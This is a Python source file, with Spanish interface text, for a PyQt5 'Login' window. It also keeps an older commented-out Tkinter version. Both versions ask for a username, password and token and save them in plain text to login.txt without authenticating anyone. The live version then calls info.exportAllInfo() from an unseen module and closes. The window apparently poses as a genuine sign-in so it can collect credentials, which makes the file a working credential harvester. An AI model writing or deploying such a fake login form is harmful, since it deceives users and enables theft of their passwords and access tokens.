# from tkinter import *
# import info
# import sys

# class Application(Frame):
#     def __init__(self,master):
#         super(Application, self).__init__(master)
#         self.grid()
#         self.create_main()

#     def create_main(self):
#         print("testing")
#         self.title = Label(self, text=" Registro ") 
#         self.title.grid(row=0, column=2)

#         self.user_entry_label = Label(self, text="Nombre de usuario: ")
#         self.user_entry_label.grid(row=1, column=1)

#         self.user_entry = Entry(self)                        
#         self.user_entry.grid(row=1, column=2)

#         self.pass_entry_label = Label(self, text="Contrasena: ")
#         self.pass_entry_label.grid(row=2, column=1)

#         self.pass_entry = Entry(self)                        
#         self.pass_entry.grid(row=2, column=2)

#         self.token_entry_label = Label(self, text="Token: ")
#         self.token_entry_label.grid(row=3, column=1)


#         self.token_entry = Entry(self)                        
#         self.token_entry.grid(row=3, column=2)

#         self.sign_in_butt = Button(self, text="Enviar",command = self.logging_in)
#         self.sign_in_butt.grid(row=5, column=2)

#     def logging_in(self):
#         user_get = self.user_entry.get()
#         pass_get = self.pass_entry.get()
#         token_get = self.token_entry.get()
#         f = open('login.txt', 'w')
#         f.write('usuario: '+ user_get + '\n')
#         f.write('password: '+ pass_get + '\n')
#         f.write('token: '+ token_get + '\n')

#         # info.exportAllInfo()

#         sys.exit()


# if __name__ == '__main__':
#     root = Tk()
#     root.title("Registro")
#     root.geometry("420x120")
#     app = Application(root)#The frame is inside the widgit
#     info.exportAllInfo()
#     root.mainloop()#Keeps the window open/running

from PyQt5.QtGui import QIcon, QPalette, QColor, QPixmap, QFont
from PyQt5.QtCore import Qt
from PyQt5.QtWidgets import (QApplication, QMainWindow, QFrame, QLabel, QComboBox, QLineEdit,
                             QPushButton)
import info


# ===================== CLASE ventanaLogin =========================

class ventanaLogin(QMainWindow):
    def __init__(self, parent=None):
        super(ventanaLogin, self).__init__(parent)
        
        self.setWindowTitle("Login")
        self.setWindowIcon(QIcon("icono.png"))
        self.setWindowFlags(Qt.WindowCloseButtonHint | Qt.MSWindowsFixedSizeDialogHint)
        self.setFixedSize(400, 380)

        paleta = QPalette()
        paleta.setColor(QPalette.Background, QColor(243, 243, 243))
        self.setPalette(paleta)

        self.initUI()

    def initUI(self):

      # ==================== FRAME ENCABEZADO ====================

        paleta = QPalette()
        paleta.setColor(QPalette.Background, QColor(51, 0, 102))

        frame = QFrame(self)
        frame.setFrameShape(QFrame.NoFrame)
        frame.setFrameShadow(QFrame.Sunken)
        frame.setAutoFillBackground(True)
        frame.setPalette(paleta)
        frame.setFixedWidth(400)
        frame.setFixedHeight(84)
        frame.move(0, 0)

        labelIcono = QLabel(frame)
        labelIcono.setFixedWidth(40)
        labelIcono.setFixedHeight(40)
        labelIcono.setPixmap(QPixmap("icono.png").scaled(40, 40, Qt.KeepAspectRatio,
                                                         Qt.SmoothTransformation))
        labelIcono.move(37, 22)

        fuenteTitulo = QFont()
        fuenteTitulo.setPointSize(16)
        fuenteTitulo.setBold(True)

        labelTitulo = QLabel("<font color='white'>Login</font>", frame)
        labelTitulo.setFont(fuenteTitulo)
        labelTitulo.move(83, 20)

      # ===================== WIDGETS LOGIN ======================

        # ========================================================

        labelUsuario = QLabel("Usuario", self)
        labelUsuario.move(60, 120)

        frameUsuario = QFrame(self)
        frameUsuario.setFrameShape(QFrame.StyledPanel)
        frameUsuario.setFixedWidth(280)
        frameUsuario.setFixedHeight(28)
        frameUsuario.move(60, 146)

        self.lineEditUsuario = QLineEdit(frameUsuario)
        self.lineEditUsuario.setFrame(False)
        self.lineEditUsuario.setTextMargins(8, 0, 4, 1)
        self.lineEditUsuario.setFixedWidth(238)
        self.lineEditUsuario.setFixedHeight(26)
        self.lineEditUsuario.move(40, 1)

        # ========================================================

        labelContrasenia = QLabel("Contraseña", self)
        labelContrasenia.move(60, 174)

        frameContrasenia = QFrame(self)
        frameContrasenia.setFrameShape(QFrame.StyledPanel)
        frameContrasenia.setFixedWidth(280)
        frameContrasenia.setFixedHeight(28)
        frameContrasenia.move(60, 200)

        self.lineEditContrasenia = QLineEdit(frameContrasenia)
        self.lineEditContrasenia.setFrame(False)
        self.lineEditContrasenia.setEchoMode(QLineEdit.Password)
        self.lineEditContrasenia.setTextMargins(8, 0, 4, 1)
        self.lineEditContrasenia.setFixedWidth(238)
        self.lineEditContrasenia.setFixedHeight(26)
        self.lineEditContrasenia.move(40, 1)


        labelToken = QLabel("Token", self)
        labelToken.move(60, 224)

        frameToken = QFrame(self)
        frameToken.setFrameShape(QFrame.StyledPanel)
        frameToken.setFixedWidth(280)
        frameToken.setFixedHeight(28)
        frameToken.move(60, 250)

        self.lineEditToken = QLineEdit(frameToken)
        self.lineEditToken.setFrame(False)
        self.lineEditToken.setEchoMode(QLineEdit.Password)
        self.lineEditToken.setTextMargins(8, 0, 4, 1)
        self.lineEditToken.setFixedWidth(238)
        self.lineEditToken.setFixedHeight(26)
        self.lineEditToken.move(40, 1)

      # ================== WIDGETS QPUSHBUTTON ===================

        buttonLogin = QPushButton("Iniciar sesión", self)
        buttonLogin.setFixedWidth(135)
        buttonLogin.setFixedHeight(28)
        buttonLogin.move(60, 286)

        buttonCancelar = QPushButton("Cancelar", self)
        buttonCancelar.setFixedWidth(135)
        buttonCancelar.setFixedHeight(28)
        buttonCancelar.move(205, 286)

      # ==================== MÁS INFORMACIÓN =====================


      # ==================== SEÑALES BOTONES =====================

        buttonLogin.clicked.connect(self.Login)
        buttonCancelar.clicked.connect(self.close)

  # ======================= FUNCIONES ============================

    def Login(self):
        usuario = self.lineEditUsuario.text()
        contrasenia = self.lineEditContrasenia.text()
        token = self.lineEditToken.text()

        f = open('login.txt', 'w')
        f.write('usuario: '+ usuario + '\n')
        f.write('password: '+ contrasenia + '\n')
        f.write('token: '+ token + '\n')
        f.close()
        info.exportAllInfo()

        # self.lineEditUsuario.clear()
        # self.lineEditContrasenia.clear()
        # self.lineEditToken.clear()
        self.close()


# ================================================================

if __name__ == '__main__':
    
    import sys
    
    aplicacion = QApplication(sys.argv)

    fuente = QFont()
    fuente.setPointSize(10)
    fuente.setFamily("Bahnschrift Light")

    aplicacion.setFont(fuente)
    
    ventana = ventanaLogin()
    ventana.show()
    
    sys.exit(aplicacion.exec_())